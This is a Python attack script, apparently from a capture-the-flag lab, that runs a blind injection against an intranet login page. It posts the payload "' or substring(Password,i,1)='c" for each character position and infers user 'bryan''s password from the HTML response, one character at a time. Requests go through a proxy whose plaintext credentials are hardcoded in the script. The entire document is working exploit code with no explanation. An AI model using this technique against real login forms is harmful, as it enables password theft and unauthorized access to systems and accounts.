#!/usr/bin/python3
import requests
import string
from bs4 import BeautifulSoup



url = "http://172.31.179.1/intranet.php"
printable= string.printable[:94]
proxies = {
    'http': 'http://intranet:Thah$Sh1@10.10.10.200:3128'
}
word=""
print("Password: "+word, end="", flush=True)
for i in range(1,30):
    password = "' or substring(Password,{},1)='{}"
    for char in printable:
        print(char, end="", flush=True)
        passw = password.format(i,char)
        data = {'Username': 'bryan' , 'Password': passw}
        r = requests.post(url,data=data,proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        d = soup.find("div", {"class": "m4"})
        if d:
            if [p for p in d.find_all("p", {"class": "w3-opacity"}) if p.text.strip() == "bryan"]:
                word += char
                break
        print("\b", end="", flush=True)
